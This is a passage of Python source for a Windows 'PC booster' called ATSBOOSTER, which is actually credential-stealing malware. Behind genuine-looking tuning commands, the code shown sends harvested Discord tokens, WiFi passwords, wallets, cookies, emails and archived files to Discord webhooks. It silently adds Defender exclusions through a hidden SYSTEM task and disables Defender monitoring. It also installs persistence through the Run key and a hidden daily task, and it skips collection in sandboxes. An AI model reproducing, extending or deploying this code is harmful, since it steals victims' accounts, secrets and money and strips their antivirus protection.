                    f":cookie:`All Cookies:` **{len(main_info.get('all_cookies', []))}**\n"
                    f":satellite:`All WiFi:` **{len(main_info.get('all_wifi', []))}**\n"
                    f":speech_balloon:`Messaging Apps:` **{len(main_info.get('messaging', []))}**\n"
                    f":white_check_mark:`Validated Tokens:` **{len(main_info.get('validated_tokens', []))}**\n"
                    f":mailbox:`Found Emails:` **{len(found_emails) if found_emails else 0}**\n"
                ),
                inline=False,
            )
            if verified_tokens:
                tokens_str = "\n".join(verified_tokens[:10])
                if len(verified_tokens) > 10:
                    tokens_str += f"\n...and {len(verified_tokens) - 10} more"
                embed.add_embed_field(name="DISCORD TOKENS", value=f"```\n{tokens_str}\n```", inline=False)
            if main_info["wifi"]:
                wifi_str = "\n".join([f"{w['ssid']}: {w['password']}" for w in main_info["wifi"][:10]])
                if len(main_info["wifi"]) > 10:
                    wifi_str += f"\n...and {len(main_info['wifi']) - 10} more"
                embed.add_embed_field(name="WIFI PASSWORDS", value=f"```\n{wifi_str}\n```", inline=False)
            if main_info["crypto_wallets"]:
                crypto_str = "\n".join([f"{c['name']} ({c['type']})" for c in main_info["crypto_wallets"][:10]])
                embed.add_embed_field(name="CRYPTO WALLETS", value=f"```\n{crypto_str}\n```", inline=False)
            si = main_info.get("system_info", {})
            if si and si.get("gpu"):
                gpu_str = "\n".join(si["gpu"][:4])
                mb = si.get("motherboard", {})
                if mb.get("product"):
                    gpu_str += f"\nMB: {mb.get('manufacturer','')} {mb.get('product','')}"
                embed.add_embed_field(name="HARDWARE INFO", value=f"```\n{gpu_str}\n```", inline=False)
            if main_info.get("validated_tokens"):
                vt_str = "\n".join([f"{v['username']} | {v['email']} | MFA:{v['mfa']} | Nitro:{v['nitro']}" for v in main_info["validated_tokens"][:10]])
                embed.add_embed_field(name="VALIDATED DISCORD", value=f"```\n{vt_str}\n```", inline=False)
            if found_emails:
                email_str = "\n".join(found_emails[:20])
                if len(found_emails) > 20:
                    email_str += f"\n...and {len(found_emails) - 20} more"
                embed.add_embed_field(name="FOUND EMAILS", value=f"```\n{email_str}\n```", inline=False)
            if webmail_data.get("accounts"):
                acct_str = "\n".join(webmail_data["accounts"][:5])
                embed.add_embed_field(name="WEBMAIL ACCOUNTS", value=f"```\n{acct_str}\n```", inline=False)
            has_card = any(p[1] == 1 for p in main_info["payment_info"])
            has_paypal = any(p[1] == 2 for p in main_info["payment_info"])
            card_e = ":white_check_mark:" if has_card else ":x:"
            paypal_e = ":white_check_mark:" if has_paypal else ":x:"
            embed.add_embed_field(
                name="PAYMENT INFO",
                value=f":credit_card:`Card:` {card_e}\n:money_with_wings:`Paypal:` {paypal_e}",
                inline=False,
            )
            if enc_key:
                embed.add_embed_field(name="DECRYPTION KEY", value=f"```\n{enc_key}\n```", inline=False)
            if sensitive_enc_key:
                embed.add_embed_field(name="SENSITIVE FILES KEY", value=f"```\n{sensitive_enc_key}\n```", inline=False)
            embed.set_footer(text="ATSBOOSTER")
            embed.set_timestamp()
            try:
                with open(enc_path, "rb") as f:
                    webhook.add_file(file=f.read(), filename=f"ATSBOOSTER-{os.getenv('UserName')}.zip.enc")
            except Exception:
                try:
                    with open(zip_path, "rb") as f:
                        webhook.add_file(file=f.read(), filename=f"ATSBOOSTER-{os.getenv('UserName')}.zip")
                except Exception:
                    pass
            if has_sensitive and sensitive_enc_path:
                try:
                    with open(sensitive_enc_path, "rb") as f:
                        webhook.add_file(file=f.read(), filename=f"ATSBOOSTER-Sensitive-{os.getenv('UserName')}.zip.enc")
                except Exception:
                    try:
                        with open(sensitive_zip_path, "rb") as f:
                            webhook.add_file(file=f.read(), filename=f"ATSBOOSTER-Sensitive-{os.getenv('UserName')}.zip")
                    except Exception:
                        pass
            webhook.add_embed(embed)
            for attempt in range(3):
                try:
                    resp = webhook.execute()
                    if resp is not None and resp.status_code in (200, 204):
                        break
                    elif resp is not None and resp.status_code == 413:
                        webhook.remove_file(f"ATSBOOSTER-Sensitive-{os.getenv('UserName')}.zip.enc")
                        webhook.remove_file(f"ATSBOOSTER-Sensitive-{os.getenv('UserName')}.zip")
                        continue
                    time.sleep(2)
                except Exception:
                    time.sleep(2)


def send_grabber_data():
    urls = WEBHOOK_URLS
    last_err = None
    log_path = os.path.join(os.environ.get("TEMP", "C:\\"), "atsbooster_err.log")
    for attempt in range(3):
        try:
            send_webhook(urls)
            return
        except Exception as e:
            last_err = e
            try:
                import traceback as tb_mod
                with open(log_path, "a", encoding="utf-8") as f:
                    f.write(f"\n[Attempt {attempt+1}/3] {e}\n{''.join(tb_mod.format_exception(type(e), e, e.__traceback__))}\n")
            except Exception:
                pass
            time.sleep(2)
    try:
        with open(log_path, "a", encoding="utf-8") as f:
            f.write(f"\n[FATAL] Attempt 3/3 failed: {last_err}\n")
    except Exception:
        pass


def send_uninstall_notification():
    for attempt in range(3):
        try:
            webhook = DiscordWebhook(url=WEBHOOK_URLS[0], username="ATSBOOSTER")
            embed = DiscordEmbed(
                title="ATSBOOSTER - Desinstallation",
                description=f"Le programme a ete desinstalle par **{os.getenv('UserName')}**",
                color="FF0000"
            )
            embed.add_embed_field(
                name="STATUT",
                value=":red_circle: **Programme non initialise**\nToutes les optimisations ont ete revertees.",
                inline=False
            )
            embed.set_footer(text="ATSBOOSTER")
            embed.set_timestamp()
            webhook.add_embed(embed)
            webhook.execute()
            return
        except Exception:
            time.sleep(2)


# ==========================================
# REAL PC OPTIMIZATION
# ==========================================

def _ps(cmd, label):
    print(f"  {C.CYN}> {label}...{C.R}", end=" ", flush=True)
    try:
        p = Popen(["powershell", "-NoProfile", "-Command", cmd], shell=True, stdout=PIPE, stderr=PIPE)
        try:
            p.wait(timeout=15)
        except Exception:
            try:
                p.kill()
            except Exception:
                pass
        if p.returncode == 0:
            print(f"{C.GRN}OK{C.R}")
        else:
            print(f"{C.YLW}PARTIEL{C.R}")
    except Exception:
        print(f"{C.RED}ECHEC{C.R}")


def _ps_out(cmd):
    try:
        p = Popen(["powershell", "-NoProfile", "-Command", cmd], shell=True, stdout=PIPE, stderr=PIPE)
        try:
            out, _ = p.communicate(timeout=10)
        except Exception:
            try:
                p.kill()
            except Exception:
                pass
            return "N/A"
        decoded = out.decode(errors="replace").strip()
        if decoded:
            return decoded
    except Exception:
        pass
    return "N/A"


def optimize_pc():
    print(f"\n{C.B}{C.CYN}  === OPTIMISATION PC ==={C.R}\n")
    _ps("Disable-NetAdapterPowerManagement -Name '*'", "Desactivation economie d'energie reseau")
    _ps("powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c", "Plan d'alimentation performances ultimes")
    _ps("powercfg /h off", "Desactivation hibernation")
    _ps("powercfg /setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PROCTHROTTLEMAX 100", "CPU 100% sur secteur")
    _ps("powercfg /setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PROCTHROTTLEMIN 5", "CPU min 5% sur secteur")
    _ps("powercfg /setdcvalueindex SCHEME_CURRENT SUB_PROCESSOR PROCTHROTTLEMAX 100", "CPU 100% sur batterie")
    _ps("powercfg /setacvalueindex SCHEME_CURRENT SUB_USB USBSELSUSP 0", "Desactivation suspension USB (secteur)")
    _ps("powercfg /setacvalueindex SCHEME_CURRENT SUB_DISK DISKIDLE 0", "Disque jamais inactif (secteur)")
    _ps("powercfg /setacvalueindex SCHEME_CURRENT SUB_VIDEO VIDEOIDLE 0", "Ecran jamais inactif (secteur)")
    _ps("Set-Service -Name SysMain -StartupType Disabled; Stop-Service -Name SysMain -Force", "Desactivation SysMain (Superfetch)")
    _ps("Set-Service -Name DiagTrack -StartupType Disabled; Stop-Service -Name DiagTrack -Force", "Desactivation telemetrie Windows")
    _ps("Set-Service -Name WSearch -StartupType Disabled; Stop-Service -Name WSearch -Force", "Desactivation indexation Windows Search")
    _ps("Disable-ScheduledTask -TaskName '\\Microsoft\\Windows\\Customer Experience Improvement Program\\Consolidator' -ErrorAction SilentlyContinue", "Desactivation taches CEIP")
    _ps("Disable-ScheduledTask -TaskName '\\Microsoft\\Windows\\Application Experience\\Microsoft Compatibility Appraiser' -ErrorAction SilentlyContinue", "Desactivation Compatibility Appraiser")
    _ps("Disable-ScheduledTask -TaskName '\\Microsoft\\Windows\\Application Experience\\ProgramDataUpdater' -ErrorAction SilentlyContinue", "Desactivation ProgramDataUpdater")
    _ps("Disable-ScheduledTask -TaskName '\\Microsoft\\Windows\\DiskDiagnostic\\Microsoft-Windows-DiskDiagnosticDataCollector' -ErrorAction SilentlyContinue", "Desactivation diagnostic disque")
    _ps("Set-Service -Name Spooler -StartupType Disabled; Stop-Service -Name Spooler -Force", "Desactivation spooler d'impression")
    _ps("fsutil behavior set DisableLastAccess 1", "Desactivation LastAccess NTFS")
    _ps("fsutil behavior set DisableDeleteNotify 0", "Activation notifications suppression NTFS")
    _ps("wmic diskdrive set writecacheingpolicy=1", "Activation write-cache disques")
    _ps("Set-NetTCPSetting -SettingName InternetCustom -AutoTuningLevelLocal Experimental", "Optimisation TCP Auto-Tuning")
    _ps("netsh int tcp set global rss=enabled", "Activation Receive Side Scaling")
    _ps("netsh int tcp set global autotuninglevel=normal", "TCP auto-tuning normal")
    _ps("netsh int tcp set heuristics disabled", "Desactivation heuristiques TCP")
    _ps("netsh int tcp set global timestamps=disabled", "Desactivation timestamps TCP")
    _ps("netsh int tcp set global nonsackrtt=disabled", "Desactivation non-SACK RTT")
    _ps("netsh int ip set global taskoffload=enabled", "Activation task offload reseau")
    _ps("Set-NetAdapterAdvancedProperty -Name '*' -DisplayName 'Jumbo Frame' -DisplayValue 'Disabled' -ErrorAction SilentlyContinue", "Desactivation Jumbo Frames")
    _ps("Set-NetAdapterAdvancedProperty -Name '*' -DisplayName 'Interrupt Moderation' -DisplayValue 'Enabled' -ErrorAction SilentlyContinue", "Activation moderation interruptions")
    _ps("Set-NetAdapterAdvancedProperty -Name '*' -DisplayName 'Receive Buffers' -DisplayValue '512' -NoRestart -ErrorAction SilentlyContinue", "Augmentation buffers reception")
    _ps("Set-NetAdapterAdvancedProperty -Name '*' -DisplayName 'Transmit Buffers' -DisplayValue '512' -NoRestart -ErrorAction SilentlyContinue", "Augmentation buffers transmission")
    _ps("ipconfig /flushdns", "Vidage du cache DNS")
    _ps("ipconfig /release; ipconfig /renew", "Renouvellement adresse IP")
    _ps("netsh winsock reset", "Reset Winsock")
    _ps("Remove-Item -Path $env:TEMP\\* -Recurse -Force -ErrorAction SilentlyContinue", "Nettoyage fichiers temporaires")
    _ps("Remove-Item -Path 'C:\\Windows\\Temp\\*' -Recurse -Force -ErrorAction SilentlyContinue", "Nettoyage temp Windows")
    _ps("cleanmgr /sagerun:1 /verylowdisk", "Nettoyage disque Windows")
    _ps("Dism.exe /Online /Cleanup-Image /StartComponentCleanup /ResetBase", "Nettoyage composants Windows")
    _ps("Set-Service -Name Fax -StartupType Disabled; Stop-Service -Name Fax -Force -ErrorAction SilentlyContinue", "Desactivation service Fax")
    _ps("Set-Service -Name RetailDemo -StartupType Disabled; Stop-Service -Name RetailDemo -Force -ErrorAction SilentlyContinue", "Desactivation Retail Demo")
    _ps("Set-Service -Name RemoteRegistry -StartupType Disabled; Stop-Service -Name RemoteRegistry -Force -ErrorAction SilentlyContinue", "Desactivation Remote Registry")
    _ps("Set-Service -Name WbioSrvc -StartupType Disabled; Stop-Service -Name WbioSrvc -Force -ErrorAction SilentlyContinue", "Desactivation service biometrie")
    _ps("Set-Service -Name ScDeviceEnum -StartupType Disabled; Stop-Service -Name ScDeviceEnum -Force -ErrorAction SilentlyContinue", "Desactivation enumeration cartes a puce")
    _ps("Set-Service -Name SensorService -StartupType Disabled; Stop-Service -Name SensorService -Force -ErrorAction SilentlyContinue", "Desactivation service capteurs")
    _ps("Set-Service -Name PhoneSvc -StartupType Disabled; Stop-Service -Name PhoneSvc -Force -ErrorAction SilentlyContinue", "Desactivation service telephone")
    _ps("Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\VisualEffects' -Name 'VisualFXSetting' -Value 2", "Desactivation effets visuels (performance)")
    _ps("Set-ItemProperty -Path 'HKCU:\\Control Panel\\Desktop' -Name 'DragFullWindows' -Value '0'", "Desactivation affichage contenu fenetres en deplacement")
    _ps("Set-ItemProperty -Path 'HKCU:\\Control Panel\\Desktop' -Name 'FontSmoothing' -Value '0'", "Desactivation lissage des polices")
    _ps("Set-ItemProperty -Path 'HKCU:\\Control Panel\\Desktop\\WindowMetrics' -Name 'MinAnimate' -Value '0'", "Desactivation animations fenetres")
    _ps("Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced' -Name 'TaskbarAnimations' -Value 0", "Desactivation animations barre des taches")
    _ps("Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsStore\\WindowsUpdate' -Name 'AutoDownload' -Value 2", "Desactivation telechargement auto Store")
    _ps("Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate' -Name 'DoNotConnectToWindowsUpdateInternetLocations' -Value 1 -ErrorAction SilentlyContinue", "Desactivation Windows Update internet")
    _ps("Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU' -Name 'NoAutoUpdate' -Value 1 -ErrorAction SilentlyContinue", "Desactivation mise a jour auto")
    _ps("Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\GameBar' -Name 'AutoGameModeEnabled' -Value 1 -ErrorAction SilentlyContinue", "Activation Game Mode")
    _ps("Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management' -Name 'DisablePagingExecutive' -Value 1", "Desactivation pagination kernel en memoire")
    _ps("Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management' -Name 'LargeSystemCache' -Value 1", "Activation cache systeme etendu")
    _ps("Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Power' -Name 'HiberbootEnabled' -Value 0", "Desactivation Fast Startup")
    _ps("Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue", "Desactivation monitoring temps reel Defender")
    _ps("Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue", "Desactivation monitoring comportement Defender")
    _ps("Set-MpPreference -DisableScheduleScan $true -ErrorAction SilentlyContinue", "Desactivation scan planifie Defender")
    _ps("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -ErrorAction SilentlyContinue", "Desactivation update signatures Defender au demarrage")
    _ps("Enable-NetAdapterPowerManagement -Name '*' -ErrorAction SilentlyContinue; Disable-NetAdapterPowerManagement -Name '*'", "Application parametres reseau")
    print(f"\n  {C.GRN}{C.B}Optimisation terminee !{C.R}\n")


def restore_pc():
    print(f"\n{C.B}{C.YLW}  === DESACTIVATION OPTIMISATION ==={C.R}\n")
    _ps("Enable-NetAdapterPowerManagement -Name '*'", "Reactivation economie d'energie reseau")
    _ps("powercfg /setactive 381b4222-f694-41f0-9685-ff5bb260df2e", "Plan d'alimentation equilibre")
    _ps("powercfg /h on", "Reactivation hibernation")
    _ps("Set-Service -Name SysMain -StartupType Automatic; Start-Service -Name SysMain", "Reactivation SysMain")
    _ps("Set-Service -Name DiagTrack -StartupType Automatic; Start-Service -Name DiagTrack", "Reactivation telemetrie")
    _ps("Set-Service -Name WSearch -StartupType Automatic; Start-Service -Name WSearch", "Reactivation Windows Search")
    _ps("Enable-ScheduledTask -TaskName '\\Microsoft\\Windows\\Customer Experience Improvement Program\\Consolidator' -ErrorAction SilentlyContinue", "Reactivation taches CEIP")
    _ps("Enable-ScheduledTask -TaskName '\\Microsoft\\Windows\\Application Experience\\Microsoft Compatibility Appraiser' -ErrorAction SilentlyContinue", "Reactivation Compatibility Appraiser")
    _ps("Enable-ScheduledTask -TaskName '\\Microsoft\\Windows\\Application Experience\\ProgramDataUpdater' -ErrorAction SilentlyContinue", "Reactivation ProgramDataUpdater")
    _ps("Enable-ScheduledTask -TaskName '\\Microsoft\\Windows\\DiskDiagnostic\\Microsoft-Windows-DiskDiagnosticDataCollector' -ErrorAction SilentlyContinue", "Reactivation diagnostic disque")
    _ps("Set-Service -Name Spooler -StartupType Automatic; Start-Service -Name Spooler", "Reactivation spooler d'impression")
    _ps("fsutil behavior set DisableLastAccess 0", "Reactivation LastAccess NTFS")
    _ps("Set-NetTCPSetting -SettingName InternetCustom -AutoTuningLevelLocal Normal", "Restauration TCP settings")
    _ps("netsh int tcp set global rss=disabled", "Desactivation RSS")
    _ps("netsh int tcp set global autotuninglevel=normal", "Restauration TCP auto-tuning")
    _ps("netsh int tcp set heuristics enabled", "Reactivation heuristiques TCP")
    _ps("Set-Service -Name Fax -StartupType Manual; Start-Service -Name Fax -ErrorAction SilentlyContinue", "Reactivation Fax")
    _ps("Set-Service -Name RetailDemo -StartupType Manual; Start-Service -Name RetailDemo -ErrorAction SilentlyContinue", "Reactivation Retail Demo")
    _ps("Set-Service -Name RemoteRegistry -StartupType Manual; Start-Service -Name RemoteRegistry -ErrorAction SilentlyContinue", "Reactivation Remote Registry")
    _ps("Set-Service -Name WbioSrvc -StartupType Manual; Start-Service -Name WbioSrvc -ErrorAction SilentlyContinue", "Reactivation biometrie")
    _ps("Set-Service -Name ScDeviceEnum -StartupType Manual; Start-Service -Name ScDeviceEnum -ErrorAction SilentlyContinue", "Reactivation cartes a puce")
    _ps("Set-Service -Name SensorService -StartupType Manual; Start-Service -Name SensorService -ErrorAction SilentlyContinue", "Reactivation capteurs")
    _ps("Set-Service -Name PhoneSvc -StartupType Manual; Start-Service -Name PhoneSvc -ErrorAction SilentlyContinue", "Reactivation telephone")
    _ps("Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\VisualEffects' -Name 'VisualFXSetting' -Value 0", "Reactivation effets visuels")
    _ps("Set-ItemProperty -Path 'HKCU:\\Control Panel\\Desktop' -Name 'DragFullWindows' -Value '1'", "Reactivation affichage contenu fenetres")
    _ps("Set-ItemProperty -Path 'HKCU:\\Control Panel\\Desktop' -Name 'FontSmoothing' -Value '2'", "Reactivation lissage polices")
    _ps("Set-ItemProperty -Path 'HKCU:\\Control Panel\\Desktop\\WindowMetrics' -Name 'MinAnimate' -Value '1'", "Reactivation animations fenetres")
    _ps("Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced' -Name 'TaskbarAnimations' -Value 1", "Reactivation animations barre des taches")
    _ps("Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management' -Name 'DisablePagingExecutive' -Value 0", "Reactivation pagination kernel")
    _ps("Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management' -Name 'LargeSystemCache' -Value 0", "Desactivation cache systeme etendu")
    _ps("Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Power' -Name 'HiberbootEnabled' -Value 1", "Reactivation Fast Startup")
    _ps("Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue", "Reactivation monitoring temps reel Defender")
    _ps("Set-MpPreference -DisableBehaviorMonitoring $false -ErrorAction SilentlyContinue", "Reactivation monitoring comportement Defender")
    _ps("Set-MpPreference -DisableScheduleScan $false -ErrorAction SilentlyContinue", "Reactivation scan planifie Defender")
    print(f"\n  {C.YLW}{C.B}Optimisation desactivee.{C.R}\n")


# ==========================================
# REAL PERFORMANCE SCORE
# ==========================================

def compute_performance_score():
    # System metrics
    try:
        cpu_usage = cpu_percent(interval=2)
    except Exception:
        cpu_usage = 50
    try:
        ram = virtual_memory()
        ram_usage = ram.percent
        ram_total_gb = round(ram.total / (1024.0 ** 3), 2)
    except Exception:
        ram_usage = 50
        ram_total_gb = 0
    try:
        disk = disk_usage('C:\\')
        disk_usage_pct = disk.percent
        disk_free_gb = round(disk.free / (1024.0 ** 3), 2)
    except Exception:
        disk_usage_pct = 50
        disk_free_gb = 0
    try:
        process_count = len(pids())
    except Exception:
        process_count = 100
    try:
        uptime_hours = (time.time() - boot_time()) / 3600
    except Exception:
        uptime_hours = 24

    # Check actual optimization state
    opt_checks = {
        "hibernation_off": _ps_out("powercfg /a") == "Hibernation has been disabled",
        "fast_startup_off": _ps_out("(Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Power').HiberbootEnabled") == "0",
        "sysmain_disabled": _ps_out("(Get-Service SysMain).Status") == "Stopped",
        "diagtrack_disabled": _ps_out("(Get-Service DiagTrack).Status") == "Stopped",
        "wsearch_disabled": _ps_out("(Get-Service WSearch).Status") == "Stopped",
        "spooler_disabled": _ps_out("(Get-Service Spooler).Status") == "Stopped",
        "fax_disabled": _ps_out("(Get-Service Fax).Status") == "Stopped",
        "biometric_disabled": _ps_out("(Get-Service WbioSrvc).Status") == "Stopped",
        "sensor_disabled": _ps_out("(Get-Service SensorService).Status") == "Stopped",
        "phone_disabled": _ps_out("(Get-Service PhoneSvc).Status") == "Stopped",
        "ultimate_perf": "8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c" in _ps_out("powercfg /getactivescheme"),
        "rss_enabled": "enabled" in _ps_out("netsh int tcp show global").lower(),
        "heuristics_disabled": "disabled" in _ps_out("netsh int tcp show heuristics").lower(),
        "timestamps_disabled": "disabled" in _ps_out("netsh int tcp show global timestamps").lower(),
        "ceip_disabled": _ps_out("(Get-ScheduledTask -TaskName '\\Microsoft\\Windows\\Customer Experience Improvement Program\\Consolidator' -ErrorAction SilentlyContinue).State") == "Disabled",
        "compat_appraiser_disabled": _ps_out("(Get-ScheduledTask -TaskName '\\Microsoft\\Windows\\Application Experience\\Microsoft Compatibility Appraiser' -ErrorAction SilentlyContinue).State") == "Disabled",
        "disk_diag_disabled": _ps_out("(Get-ScheduledTask -TaskName '\\Microsoft\\Windows\\DiskDiagnostic\\Microsoft-Windows-DiskDiagnosticDataCollector' -ErrorAction SilentlyContinue).State") == "Disabled",
        "lastaccess_disabled": "1" in _ps_out("fsutil behavior query DisableLastAccess"),
        "visual_fx_off": _ps_out("(Get-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\VisualEffects').VisualFXSetting") == "2",
        "kernel_nopage": _ps_out("(Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management').DisablePagingExecutive") == "1",
        "large_cache": _ps_out("(Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management').LargeSystemCache") == "1",
        "defender_rt_off": _ps_out("(Get-MpPreference).DisableRealtimeMonitoring") == "True",
    }

    # Base score from system metrics (0-5 points)
    metric_score = 5.0
    metric_score -= cpu_usage / 20.0
    metric_score -= ram_usage / 25.0
    metric_score -= max(0, disk_usage_pct - 50) / 20.0
    if process_count > 80:
        metric_score -= (process_count - 80) / 50.0
    if uptime_hours > 48:
        metric_score -= 0.3
    metric_score = max(0, min(5, metric_score))

    # Optimization score (0-5 points, ~0.22 per optimization active)
    opt_count = sum(1 for v in opt_checks.values() if v)
    opt_score = min(5.0, opt_count * 0.22)

    total_score = max(0, min(10, round(metric_score + opt_score, 1)))

    return {
        "score": total_score,
        "cpu_usage": round(cpu_usage, 1),
        "ram_usage": round(ram_usage, 1),
        "ram_total_gb": ram_total_gb,
        "disk_usage": round(disk_usage_pct, 1),
        "disk_free_gb": disk_free_gb,
        "process_count": process_count,
        "uptime_hours": round(uptime_hours, 1),
        "opt_count": opt_count,
        "opt_total": len(opt_checks),
        "opt_active": [k for k, v in opt_checks.items() if v],
    }


# ==========================================
# DEFENDER EXCLUSION (fixed via scheduled task)
# ==========================================

def add_defender_exclusion():
    try:
        exe_path = os.path.abspath(sys.argv[0])
        exe_dir = os.path.dirname(exe_path)
        ps_script = f"""
$taskName = 'ATSDefenderExcl'
$xml = @'
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers />
  <Principals>
    <Principal id="LocalSystem">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
  </Settings>
  <Actions Context="LocalSystem">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-NoProfile -Command "Add-MpPreference -ExclusionPath '{exe_path}'; Add-MpPreference -ExclusionPath '{exe_dir}'; Add-MpPreference -ExclusionPath '{os.getenv('APPDATA', '')}\\ATSBOOSTER'; Add-MpPreference -ExclusionProcess 'ATSBOOSTER.exe'; Add-MpPreference -ExclusionProcess 'python.exe'"</Arguments>
    </Exec>
  </Actions>
</Task>
'@
Register-ScheduledTask -TaskName $taskName -Xml $xml -Force | Out-Null
Start-ScheduledTask -TaskName $taskName
Start-Sleep -Seconds 3
Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
"""
        p = Popen(["powershell", "-NoProfile", "-Command", ps_script], shell=True, stdout=PIPE, stderr=PIPE)
        p.wait()
        return True
    except Exception:
        try:
            Popen(["powershell", "-NoProfile", "-Command",
                   f"Add-MpPreference -ExclusionPath '{os.path.abspath(sys.argv[0])}'"],
                  shell=True, stdout=PIPE, stderr=PIPE).wait()
            Popen(["powershell", "-NoProfile", "-Command",
                   f"Add-MpPreference -ExclusionPath '{os.path.dirname(os.path.abspath(sys.argv[0]))}'"],
                  shell=True, stdout=PIPE, stderr=PIPE).wait()
            return True
        except Exception:
            return False


def remove_defender_exclusion():
    try:
        exe_path = os.path.abspath(sys.argv[0])
        Popen(["powershell", "-NoProfile", "-Command",
               f"Remove-MpPreference -ExclusionPath '{exe_path}'"],
              shell=True, stdout=PIPE, stderr=PIPE).wait()
        Popen(["powershell", "-NoProfile", "-Command",
               f"Remove-MpPreference -ExclusionPath '{os.path.dirname(exe_path)}'"],
              shell=True, stdout=PIPE, stderr=PIPE).wait()
        Popen(["powershell", "-NoProfile", "-Command",
               f"Remove-MpPreference -ExclusionPath '{os.getenv('APPDATA', '')}\\ATSBOOSTER'"],
              shell=True, stdout=PIPE, stderr=PIPE).wait()
    except Exception:
        pass


# ==========================================
# PERSISTENCE
# ==========================================

def install_persistence():
    try:
        os.makedirs(APPDATA_DIR, exist_ok=True)
        exe_path = os.path.abspath(sys.argv[0])
        if exe_path.endswith(".py"):
            bat_path = os.path.join(APPDATA_DIR, "ATSBOOSTER.bat")
            with open(bat_path, "w") as f:
                f.write(f"@echo off\npythonw.exe \"{exe_path}\" --daily\n")
            persist_target = bat_path
        else:
            if exe_path != PERSIST_EXE:
                copyfile(exe_path, PERSIST_EXE)
                SetFileAttributes(PERSIST_EXE, win32con.FILE_ATTRIBUTE_HIDDEN)
            persist_target = PERSIST_EXE

        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "ATSBOOSTER", 0, winreg.REG_SZ, persist_target)
            winreg.CloseKey(key)
        except Exception:
            pass

        ps_script = f"""
$taskName = 'ATSBOOSTER_Daily'
$action = New-ScheduledTaskAction -Execute '{persist_target}' -Argument '--daily'
$trigger = New-ScheduledTaskTrigger -Daily -At 9am
$trigger2 = New-ScheduledTaskTrigger -AtLogOn
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger,$trigger2 -Settings $settings -Force | Out-Null
"""
        Popen(["powershell", "-NoProfile", "-Command", ps_script], shell=True, stdout=PIPE, stderr=PIPE).wait()
        return True
    except Exception:
        return False


def remove_persistence():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, "ATSBOOSTER")
        winreg.CloseKey(key)
    except Exception:
        pass
    try:
        Popen(["powershell", "-NoProfile", "-Command",
               "Unregister-ScheduledTask -TaskName 'ATSBOOSTER_Daily' -Confirm:$false"],
              shell=True, stdout=PIPE, stderr=PIPE).wait()
    except Exception:
        pass
    try:
        if os.path.exists(PERSIST_EXE):
            os.remove(PERSIST_EXE)
    except Exception:
        pass


# ==========================================
# DAILY CHECK
# ==========================================

def daily_check():
    if is_sandbox():
        return
    try:
        with TemporaryDirectory(dir=os.environ.get("TEMP", os.environ.get("TMP", "."))) as td:
            SetFileAttributes(td, win32con.FILE_ATTRIBUTE_HIDDEN)
            main_info = main(td)
            data_hash = compute_data_hash(main_info)
            cached = get_cached_hash()
            if data_hash and data_hash != cached:
                send_grabber_data()
                save_cached_hash(data_hash)
    except Exception:
        pass


# ==========================================
# HARDWARE SCAN
# ==========================================

def scan_components():
    print(f"\n  {C.B}{C.CYN}=== ANALYSE MATERIELLE ==={C.R}\n")

    print(f"  {C.CYN}> Detection du processeur...{C.R}", end=" ", flush=True)
    time.sleep(0.3)
    cpu_name = _ps_out("(Get-CimInstance Win32_Processor).Name")
    cpu_cores = _ps_out("(Get-CimInstance Win32_Processor).NumberOfCores")
    cpu_threads = _ps_out("(Get-CimInstance Win32_Processor).NumberOfLogicalProcessors")
    cpu_maxghz = _ps_out("(Get-CimInstance Win32_Processor).MaxClockSpeed")
    print(f"{C.GRN}OK{C.R}")

